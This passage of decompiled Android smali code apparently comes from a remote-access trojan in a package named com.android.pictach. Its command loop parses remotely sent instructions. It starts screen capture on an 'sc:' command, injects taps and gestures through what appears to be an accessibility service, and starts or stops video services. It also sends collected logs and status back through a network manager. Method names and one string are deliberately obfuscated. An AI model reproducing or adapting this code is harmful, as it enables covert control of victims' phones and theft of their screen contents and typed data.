    goto/16 :goto_7

    .line 388
    :cond_14
    :try_start_19
    aget-object v3, v8, v6

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_19 .. :try_end_19} :catch_0

    if-eqz v3, :cond_15

    .line 393
    :try_start_1a
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    const-string v3, "wait"

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseOFK:Ljava/lang/String;

    .line 395
    sget-object v3, Lcom/android/pictach/Utils;->l_Utils_g:Ljava/lang/String;

    sget-object v9, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    aget-object v6, v8, v6

    invoke-virtual {v6, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v9, v4}, Lcom/android/pictach/Firebase;->FirebaseRD(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    .line 396
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    const-string v3, "on"

    sput-object v3, Lcom/android/pictach/Firebase;->FirebaseOFK:Ljava/lang/String;
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1a .. :try_end_1a} :catch_0

    goto/16 :goto_7

    .line 406
    :cond_15
    :try_start_1b
    aget-object v3, v8, v6

    invoke-virtual {v3, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1b .. :try_end_1b} :catch_0

    if-eqz v3, :cond_19

    .line 411
    :try_start_1c
    sget v3, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x18

    if-lt v3, v4, :cond_24

    .line 412
    aget-object v3, v8, v6

    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "clk"

    .line 413
    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_18

    const-string v4, "Bc"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_18

    const-string v4, "Ho"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_18

    const-string v4, "RC"

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_16

    goto :goto_5

    :cond_16
    const-string v4, ":"

    .line 418
    invoke-static {v4}, Ljava/util/regex/Pattern;->quote(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 419
    array-length v4, v3

    new-array v4, v4, [Landroid/graphics/Point;

    const/4 v8, 0x0

    .line 421
    :goto_4
    array-length v9, v3

    if-ge v8, v9, :cond_17

    .line 422
    aget-object v9, v3, v8

    const-string v10, "{"

    invoke-virtual {v9, v10, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    const-string v10, "}"

    invoke-virtual {v9, v10, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    const-string v10, ","

    invoke-virtual {v9, v10}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    .line 424
    aget-object v10, v9, v5

    const-string v11, "="

    invoke-virtual {v10, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v10

    aget-object v10, v10, v6

    invoke-static {v10}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v10

    .line 425
    aget-object v9, v9, v6

    const-string v11, "="

    invoke-virtual {v9, v11}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v9

    aget-object v9, v9, v6

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    .line 427
    new-instance v11, Landroid/graphics/Point;

    invoke-direct {v11, v10, v9}, Landroid/graphics/Point;-><init>(II)V

    aput-object v11, v4, v8

    add-int/lit8 v8, v8, 0x1

    goto :goto_4

    .line 430
    :cond_17
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    const/16 v6, 0x3e8

    invoke-virtual {v3, v4, v6}, Lcom/android/pictach/Firebase;->mouseDraw([Landroid/graphics/Point;I)V

    goto/16 :goto_7

    .line 415
    :cond_18
    :goto_5
    sget-object v3, Lcom/android/pictach/love;->MyAccess:Lcom/android/pictach/Firebase;

    aget-object v4, v8, v6

    invoke-virtual {v4, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Lcom/android/pictach/Firebase;->FirebaseSW(Ljava/lang/String;)V
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1c .. :try_end_1c} :catch_0

    goto/16 :goto_7

    .line 438
    :cond_19
    :try_start_1d
    aget-object v3, v8, v6

    const-string v4, "sc:"

    invoke-virtual {v3, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1d .. :try_end_1d} :catch_0

    if-eqz v3, :cond_24

    .line 441
    :try_start_1e
    aget-object v3, v8, v6

    const-string v4, "sc:"

    invoke-virtual {v3, v4, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Lcom/android/pictach/Api;->StartScreen(Ljava/lang/String;)V
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1e .. :try_end_1e} :catch_0

    goto/16 :goto_7

    .line 450
    :cond_1a
    :try_start_1f
    const-class v3, Lcom/android/pictach/com;

    aget-object v4, p1, v5

    invoke-static {v3, v4}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1f .. :try_end_1f} :catch_0

    if-eqz v3, :cond_1b

    goto :goto_6

    :goto_6
    :try_start_20
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/android/pictach/com;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 466
    sget-object v4, Lcom/android/pictach/Config;->FTX1:Ljava/lang/String;

    invoke-virtual {v3, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 468
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_20 .. :try_end_20} :catch_0

    goto/16 :goto_7

    .line 477
    :cond_1b
    :try_start_21
    sput-boolean v5, Lcom/android/pictach/love;->F_love_ORCA:Z

    .line 478
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/android/pictach/com;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 479
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_21 .. :try_end_21} :catch_0

    const-wide/16 v3, 0x3e8

    .line 480
    :try_start_22
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_22
    .catch Ljava/lang/InterruptedException; {:try_start_22 .. :try_end_22} :catch_4
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_22 .. :try_end_22} :catch_0

    goto/16 :goto_7

    .line 492
    :cond_1c
    :try_start_23
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v11

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_1d

    .line 493
    const-class v3, Lcom/android/pictach/video;

    aget-object v7, p1, v5

    invoke-static {v3, v7}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_24

    .line 494
    new-instance v3, Landroid/content/Intent;

    aget-object v7, p1, v5

    const-class v9, Lcom/android/pictach/video;

    invoke-direct {v3, v7, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    new-array v7, v4, [Ljava/lang/String;

    .line 495
    aget-object v9, v8, v6

    aput-object v9, v7, v5

    aget-object v4, v8, v4

    aput-object v4, v7, v6

    .line 496
    sget-object v4, Lcom/android/pictach/Config;->FTX2:Ljava/lang/String;

    invoke-virtual {v3, v4, v7}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 498
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto/16 :goto_7

    .line 501
    :cond_1d
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v17

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_1e

    .line 502
    const-class v3, Lcom/android/pictach/video;

    aget-object v4, p1, v5

    invoke-static {v3, v4}, Lcom/android/pictach/LoveApi0;->illacarterithomsonwtranskschemeijohnstontscreeningnglennomaybehoptimizeelikelyfcopxchallengeh49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result v3
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_23 .. :try_end_23} :catch_0

    if-nez v3, :cond_24

    .line 506
    :try_start_24
    new-instance v3, Landroid/content/Intent;

    aget-object v4, p1, v5

    const-class v6, Lcom/android/pictach/video;

    invoke-direct {v3, v4, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 507
    aget-object v4, p1, v5

    invoke-virtual {v4, v3}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_24 .. :try_end_24} :catch_0

    goto/16 :goto_7

    .line 516
    :cond_1e
    :try_start_25
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v13

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_1f

    .line 517
    aget-object v3, p1, v5

    aget-object v4, v8, v6

    invoke-static {v3, v4}, Lcom/android/pictach/Utils;->mineralsvshemalesqgiftsjplainolearniretailerszenquiriesysceneslargumentnauaviczpolebautosm35(Landroid/content/Context;Ljava/lang/String;)V

    goto/16 :goto_7

    .line 518
    :cond_1f
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v16

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_20

    .line 519
    invoke-static {v5}, Lcom/android/pictach/Utils;->rel(Z)V

    .line 520
    aget-object v3, v8, v6

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    goto/16 :goto_7

    .line 521
    :cond_20
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v7, v7, v15

    invoke-static {v9, v7}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_21

    .line 522
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v6

    aput-object v9, v7, v6

    .line 524
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v9, v8, v4

    aput-object v9, v7, v4

    .line 525
    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v8, v8, v3

    aput-object v8, v7, v3

    .line 528
    aget-object v3, p1, v5

    const-class v7, Lcom/android/pictach/Firebase;

    invoke-static {v3, v7}, Lcom/android/pictach/Utils;->acc(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v3

    sput-boolean v3, Lcom/android/pictach/love;->k:Z

    .line 530
    sget-boolean v3, Lcom/android/pictach/love;->k:Z

    sput-boolean v3, Lcom/android/pictach/love;->k_love_live:Z

    .line 531
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v7, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v6, v7, v6

    invoke-virtual {v3, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    aget-object v4, v6, v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-boolean v4, Lcom/android/pictach/love;->k:Z

    invoke-static {v4}, Ljava/lang/String;->valueOf(Z)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "|"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/android/pictach/love;->Get_love_Logs()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    goto :goto_7

    .line 532
    :cond_21
    sget-object v3, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v4, 0xc

    aget-object v3, v3, v4

    invoke-static {v9, v3}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_22

    .line 534
    sput-boolean v5, Lcom/android/pictach/love;->k_love_live:Z

    goto :goto_7

    .line 535
    :cond_22
    sget-object v3, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v4, 0xd

    aget-object v3, v3, v4

    invoke-static {v9, v3}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_23

    .line 536
    aget-object v3, p1, v5

    invoke-static {v3, v6}, Lcom/android/pictach/Utils;->WK_Utils_L(Landroid/content/Context;Z)V

    .line 537
    aget-object v3, v8, v6

    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-static {v3, v4}, Lcom/android/pictach/NetworkManager;->locatevlibertyqlightsqfacestlaboratoriesxelliottdwhereasjsitemaphbennettiratiohlehabortionq47(Ljava/lang/String;[B)V

    goto :goto_7

    .line 538
    :cond_23
    sget-object v3, Lcom/android/pictach/love;->c_love_mn:[Ljava/lang/String;

    const/16 v4, 0xe

    aget-object v3, v3, v4

    invoke-static {v9, v3}, Lcom/android/pictach/Utils;->helpscanintnum(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_24

    .line 539
    sget-boolean v3, Lcom/android/pictach/NetworkManager;->ec_NetworkManager_ho:Z

    if-eqz v3, :cond_24

    const-string v3, "\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc\u20abCRAZY\u03b8\u1d62\u05d9\u02bf\u1623\u03b8\u02c9\u02c6\u02c9\u03b8\u03c6\u02ce$\u02c9\u02ce$\ufe73\u02ca\u2db1\u2071\u1d47\u02beCRAZY\u02d1$\u02cf\u0640\ufe73"

    .line 540
    invoke-static {v3}, Lcom/android/pictach/NetworkManager;->laughhbarbadosestrictlyoquantumjslopeksailtsubmittedtcontrollersqhelicoptercheatermculturalv45(Ljava/lang/String;)V

    .line 544
    :catch_4
    :cond_24
    :goto_7
    sget-boolean v3, Lcom/android/pictach/NetworkManager;->q:Z

    if-nez v3, :cond_25

    .line 545
    sget-object v3, Lcom/android/pictach/love;->L_love_i:Ljava/util/List;

    invoke-interface {v3}, Ljava/util/List;->clear()V

    goto :goto_8

    .line 547
    :cond_25
    sget-object v3, Lcom/android/pictach/love;->L_love_i:Ljava/util/List;

    invoke-interface {v3, v5}, Ljava/util/List;->remove(I)Ljava/lang/Object;
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_25 .. :try_end_25} :catch_0

    :goto_8
    const-wide/16 v3, 0x1

    .line 549
    :try_start_26
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    goto/16 :goto_0

    :cond_26
    const-wide/16 v3, 0x3e8

    .line 551
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_26
    .catch Ljava/lang/InterruptedException; {:try_start_26 .. :try_end_26} :catch_0
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_26 .. :try_end_26} :catch_0

    goto/16 :goto_0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 136
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/android/pictach/Api$ta;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 0

    .line 601
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .line 139
    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    return-void
.end method
